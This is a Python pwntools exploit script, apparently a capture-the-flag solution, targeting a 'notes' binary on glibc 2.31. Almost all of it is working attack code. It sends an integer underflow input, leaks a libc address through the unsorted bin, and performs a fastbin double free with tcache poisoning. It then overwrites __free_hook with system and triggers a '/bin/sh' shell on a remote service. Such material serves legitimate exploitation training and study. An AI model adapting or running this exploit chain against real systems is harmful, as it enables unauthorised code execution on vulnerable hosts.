#!/usr/bin/env python3

# fastbin dup + tcache poison, glibc 2.31
from pwn import *

idx = 0

def add_note(size,note):
	global idx
	p.sendlineafter("> ",b"1")
	p.sendlineafter("size: ",bytes(str(size),'utf8'))
	p.sendlineafter("content: ",note)
	idx += 1
	return idx-1

def del_note(idx):
	p.sendlineafter("> ",b"2")
	p.sendlineafter("note id: ",bytes(str(idx),'utf8'))

def view_note(idx):
	p.sendlineafter("> ",b"3")
	p.sendlineafter("note id: ",bytes(str(idx),'utf8'))
	return p.recv()

# docker cp <name>:/pwn/notes .
e = ELF("./notes",checksec=False)
# docker cp <name>:/lib/x86_64-linux-gnu/libc-2.31.so .
libc = ELF("./libc-2.31.so",checksec=False)
p = remote(args.get("HOST", "127.0.0.1"), int(args.get("PORT", 5001)))

# integer underflow
p.sendlineafter(b"How many notes you plan to use? (0-10): ",b"-1")

# fill tcache, leak via unsorted bin
for _ in range(10):
	add_note(0xf8,b"")

for i in range(8):
        del_note(i)

# served from unsortedbin, libc leak
unsorted_chunk = add_note(0x80,b"") 

data = view_note(10)
leak = data[:6]
libc.address = u64(leak.ljust(8,b"\x00")) - 0x1ecc0a
log.success(f'libc_base: {hex(libc.address)}')

p.sendline()

# clean the heap
add_note(0x100,b"")
add_note(0x78,b"")

# allocate 9 0x70 chunks
for _ in range(9):
	last = add_note(0x68,b"")

# fill 0x70 tcache
for i in range(last-8,last-1,1):
	del_note(i)

# double free, chunks land in 0x70 fastbin
del_note(last-1)
del_note(last)
del_note(last-1)

# clean 0x70 tcache bin, store '/bin/sh\0' string
for _ in range(last-9,last-2,1):
	binsh = add_note(0x68,b"/bin/sh\0")

# move __free_hook to the head of 0x70 tcache bin & overwrite it with system
add_note(0x68,p64(libc.sym.__free_hook))
add_note(0x68,b"")
add_note(0x68,b"")
add_note(0x68,p64(libc.sym.system))

# system() is going to be called instead of free(), rdi points to the '/bin/sh\0' string stored in a note
del_note(binsh)

p.interactive()
